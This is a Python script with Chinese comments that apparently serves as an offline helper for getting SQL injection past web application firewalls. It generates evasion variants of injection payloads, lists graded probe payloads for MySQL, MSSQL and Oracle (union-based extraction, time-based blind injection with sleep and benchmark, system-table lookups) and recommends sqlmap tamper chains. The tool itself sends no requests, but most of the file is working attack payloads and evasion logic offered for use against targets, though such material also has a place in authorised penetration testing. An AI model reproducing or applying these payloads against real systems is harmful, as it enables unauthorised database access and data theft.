#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQL 注入 WAF 绕过辅助（离线）：等价改写生成 / 探测矩阵 / 高危词检查 / tamper 推荐。

纯标准库、离线：只做字符串改写与列表生成，不发包、不跑 sqlmap。
"""
import argparse
import re
import sys

SPACES = ("/**/", "%0a", "%09", "+")
FUNC_SWAP = {
    "substr": ("mid", "substring", "left"),
    "ascii": ("ord",),
    "sleep": ("benchmark(10000000,md5(1))",),
    "concat": ("concat_ws", "group_concat"),
    "database()": ("schema()",),
    "information_schema.tables": ("mysql.innodb_table_stats",),
    "information_schema.columns": ("mysql.innodb_index_stats",),
}
TOKENS = ("union", "select", "sleep", "benchmark", "information_schema", "load_file",
          "into outfile", "and", "or", "order by", "updatexml", "extractvalue", "@@")
TAMPER_FOR = {
    " ": ("space2comment", "space2hash", "space2mssqlblank"),
    "union": ("unionalltounion", "space2comment"),
    "select": ("randomcase", "space2comment"),
    "sleep": ("charencode", "between"),
    "information_schema": ("modsecurityversioned", "charencode"),
}
QUOTES = ("'", '"', "`")


class SqlError(ValueError):
    pass


def _split_words(payload):
    return re.findall(r"[A-Za-z_][A-Za-z0-9_]*|\S", payload)


def morph(payload, limit=40):
    """生成等价改写。返回去重后的列表，第一条为注释混写版。"""
    if not payload or not payload.strip():
        raise SqlError("payload 不能为空")
    if len(payload) > 512:
        raise SqlError("payload 过长（>512），请只传入单个注入片段")
    out, seen = [], set()

    def add(s):
        if s not in seen and len(out) < limit:
            seen.add(s)
            out.append(s)

    add(payload)
    # 1) 注释混写：把关键词内部/中间切开，靠 MySQL 把注释当空白
    for kw in ("union", "select", "and", "or"):
        if kw in payload.lower():
            idx = payload.lower().index(kw)
            head, tail = payload[:idx + len(kw)], payload[idx + len(kw):]
            add(head[:idx] + kw[:len(kw) // 2] + "/**/" + kw[len(kw) // 2:] + tail)
    # 2) 空白替换：逐个空格换成注释 / 换行 / 制表
    if " " in payload:
        for sp in SPACES:
            add(payload.replace(" ", sp))
        add(payload.replace(" ", "(%1)and(%1)".replace("%1", "")) if False else payload.replace(" and ", ")and(").replace("(", "(", 1))
    # 3) 大小写：只对含字母关键词的 payload 有意义
    if re.search(r"[a-z]", payload):
        add(payload.upper())
        add(payload.swapcase())
    # 4) union select 的括号/换行写法
    low = payload.lower()
    if "union select" in low:
        add(re.sub(r"union\s+select", "union(select", payload, flags=re.I) + ")" if "(" not in payload else payload)
        add(re.sub(r"union\s+select", "union%0aselect", payload, flags=re.I))
        add(re.sub(r"union\s+select", "union%09select", payload, flags=re.I))
    # 5) 函数替换
    for src, dsts in FUNC_SWAP.items():
        if src in low:
            for dst in dsts:
                add(re.sub(re.escape(src), lambda _m, d=dst: d, payload, flags=re.I))
    return out


def probe_matrix(db="mysql"):
    """递进探测列表：每层只比上一层多引入一种元素。"""
    db = (db or "mysql").lower()
    if db not in ("mysql", "mssql", "oracle"):
        raise SqlError("db 只能是 mysql/mssql/oracle，收到 %r" % db)
    base = [
        ("基准", "1 and 1=1"),
        ("布尔假", "1 and 1=2"),
        ("空格注释", "1/**/and/**/1=1"),
        ("空白换行", "1%0aand%0a1=1"),
        ("制表符", "1%09and%091=1"),
        ("等号替换", "1 and 1 like 1"),
        ("and 替换", "1 && 1=1"),
        ("单引号闭合", "1' and '1'='1"),
        ("注释结尾", "1' and '1'='1-- -"),
        ("井号结尾", "1' and '1'='1%23"),
    ]
    if db == "mysql":
        base += [
            ("union 基础", "' union select 1-- -"),
            ("union 注释", "' union/**/select/**/1-- -"),
            ("union 括号", "' union(select(1))-- -"),
            ("函数 mid", "' and ascii(mid(database(),1,1))>64-- -"),
            ("函数 ord", "' and ord(substr(database(),1,1))>64-- -"),
            ("时间盲注", "' and if(1,sleep(2),0)-- -"),
            ("时间 benchmark", "' and if(1,benchmark(1000000,md5(1)),0)-- -"),
            ("系统表替换", "' union select group_concat(table_name) from mysql.innodb_table_stats-- -"),
            ("十六进制串", "' union select 0x756e696f6e-- -"),
        ]
    elif db == "mssql":
        base += [("栈查询", "1;select 1--"), ("sys 表", "1 and 1=(select top 1 name from sys.objects)--")]
    else:
        base += [("dual", "' union select 1 from dual--"), ("all_tables", "' and 1=(select 1 from all_tables)--")]
    return base


def check_tokens(payload):
    low = payload.lower()
    hits = [t for t in TOKENS if t in low]
    quotes = [q for q in QUOTES if q in payload]
    comments = [c for c in ("--", "#", "/**/") if c in payload]
    tips = []
    for t in hits:
        if t in ("sleep", "benchmark"):
            tips.append("时间函数被拦：换另一个时间函数或笛卡尔积 heavy query")
        if t.startswith("information_schema"):
            tips.append("information_schema 被拦：MySQL 换 mysql.innodb_table_stats，MSSQL 换 sys.objects")
        if t in ("union", "select"):
            tips.append("%s 被拦：试注释混写 un/**/ion、大小写、或 union(select(...))" % t)
        if t in ("and", "or"):            tips.append("%s 被拦：换 && / || / %%26%%26 / %%7c%%7c" % t)
    if quotes:
        tips.append("引号被拦：字符串改 0x 十六进制或 CHAR(117,110,105,111,110)")
    if "--" in payload and "-- -" not in payload and "--%20" not in payload:
        tips.append("-- 后面必须跟空白（-- - 或 --%20），否则不构成注释")
    if "load_file" in low or "into outfile" in low:
        tips.append("文件读写还受 secure_file_priv / FILE 权限限制，绕 WAF 不够")
    return {"keywords": hits, "quotes": quotes, "comments": comments, "tips": tips}


def tamper_chain(keywords):
    """把命中的元素映射成 sqlmap --tamper= 组合（去重保序）。"""
    if keywords is None:
        raise SqlError("keywords 不能为 None")
    chosen = []
    if any(k in ("union", "select") for k in keywords):
        chosen.append("space2comment")
    for k in keywords:
        for t in TAMPER_FOR.get(k, ()):
            if t not in chosen:
                chosen.append(t)
    if not chosen:
        chosen = ["space2comment", "randomcase"]
    return ",".join(chosen)


def selftest():
    fails = []

    # 1. 正常路径：等价改写包含注释混写与大小写
    ms = morph("union select 1,2,3-- -")
    joined = " | ".join(ms)
    if "un/**/ion" not in joined and "unio/**/n" not in joined:
        fails.append("case1: 缺注释混写变体 %r" % (ms,))
    if "UNION SELECT 1,2,3-- -" not in ms:
        fails.append("case1b: 缺大写变体")
    if "union/**/select" not in joined:
        fails.append("case1c: 缺空白替换变体")
    if len(set(ms)) != len(ms):
        fails.append("case1d: 变体有重复")

    # 2. 正常路径：函数替换与探测矩阵递进
    fm = morph("1 and ascii(substr(database(),1,1))>64")
    if not any("mid(" in x for x in fm):
        fails.append("case2: substr 应换成 mid %r" % (fm,))
    if not any("ord(" in x for x in fm):
        fails.append("case2b: ascii 应换成 ord")
    pm = probe_matrix("mysql")
    if pm[0][1] != "1 and 1=1" or not any("benchmark" in p for _n, p in pm):
        fails.append("case2c: 探测矩阵首尾不对 %r" % (pm[:2],))
    if [n for n, _p in pm[:3]] != ["基准", "布尔假", "空格注释"]:
        fails.append("case2d: 探测矩阵顺序不对 %r" % ([n for n, _p in pm[:3]],))

    # 3. 正常路径：高危词检查与 tamper 推荐
    res = check_tokens("1' union select sleep(2) from information_schema.tables-- -")
    for kw in ("union", "select", "sleep", "information_schema"):
        if kw not in res["keywords"]:
            fails.append("case3: 漏报关键词 %s -> %r" % (kw, res["keywords"]))
    if "'" not in res["quotes"]:
        fails.append("case3b: 漏报引号")
    chain = tamper_chain(res["keywords"])
    if "space2comment" not in chain or "randomcase" not in chain:
        fails.append("case3c: tamper 组合不全 %r" % chain)
    if check_tokens("1 and 1=1")["keywords"] != ["and"]:
        fails.append("case3d: 简单 payload 关键词判定错")

    # 4. 边界：注释结尾规则、无空格数字型
    tip_txt = " ".join(check_tokens("1' union select 1--")["tips"])
    if "-- 后面必须跟空白" not in tip_txt:
        fails.append("case4: -- 缺空白的提醒没出现 %r" % tip_txt)
    num = morph("1/**/and/**/1=1")
    if num[0] != "1/**/and/**/1=1":
        fails.append("case4b: 首个变体应原样返回 %r" % (num[:1],))
    if "1 %0a and %0a 1=1" in num:
        fails.append("case4c: 不该出现双空格的错误替换")
    if tamper_chain([]) != "space2comment,randomcase":
        fails.append("case4d: 空命中应给默认组合")

    # 5. 边界拒绝：坏输入
    bad = [
        ("空 payload", lambda: morph("")),
        ("超长 payload", lambda: morph("a" * 600)),
        ("未知 db", lambda: probe_matrix("postgres")),
        ("keywords 为 None", lambda: tamper_chain(None)),
    ]
    for name, fn in bad:
        try:
            fn()
            fails.append("case5: %s 未被拒绝" % name)
        except SqlError:
            pass

    # 6. 参数不足：独立 parser 复现 exit 2 且静默
    tiny = argparse.ArgumentParser(prog="sql_waf_bypass", add_help=False)
    tiny.exit = lambda status=0, message=None: (_ for _ in ()).throw(SystemExit(status))
    tiny._print_message = lambda message, file=None: None
    tiny.add_argument("--x")
    try:
        tiny.error("需要 --morph/--probe/--check；或用 --selftest")
        fails.append("case6: ap.error 未抛 SystemExit")
    except SystemExit as e:
        if e.code != 2:
            fails.append("case6: 退出码 %r" % (e.code,))

    for f in fails:
        print("FAIL %s" % f, file=sys.stderr)
    if fails:
        return 1
    print("selftest ok: 6/6（注释混写与大写变体、函数替换与探测矩阵、高危词与tamper、注释空白提醒、坏输入拒绝、参数不足）")
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description="SQL 注入 WAF 绕过：等价改写 / 探测矩阵 / 高危词检查（离线）")
    ap.add_argument("--morph", metavar="PAYLOAD", default=None, help="生成等价的 WAF 绕过写法")
    ap.add_argument("--probe", action="store_true", help="输出递进探测列表")
    ap.add_argument("--db", default="mysql", choices=["mysql", "mssql", "oracle"], help="数据库类型")
    ap.add_argument("--check", metavar="PAYLOAD", default=None, help="检查高危词并给替换建议")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()
    try:
        if args.probe:
            for name, p in probe_matrix(args.db):
                print("%-14s %s" % (name, p))
            print("[*] 逐条打，哪条开始被拦就说明该条引入的元素进了黑名单")
            return 0
        if args.check is not None:
            res = check_tokens(args.check)
            print("[*] 关键词：%s" % (", ".join(res["keywords"]) or "无"))
            print("[*] 引号：%s  注释：%s" % (", ".join(res["quotes"]) or "无",
                                            ", ".join(res["comments"]) or "无"))
            for t in res["tips"]:
                print("    - %s" % t)
            print("[*] 推荐 tamper：--tamper=%s" % tamper_chain(res["keywords"]))
            return 0
        if args.morph is not None:
            for i, m in enumerate(morph(args.morph), 1):
                print("%2d. %s" % (i, m))
            return 0
        ap.error("需要 --morph/--probe/--check；或用 --selftest")
        return 2
    except SqlError as e:
        print("错误：%s" % e, file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
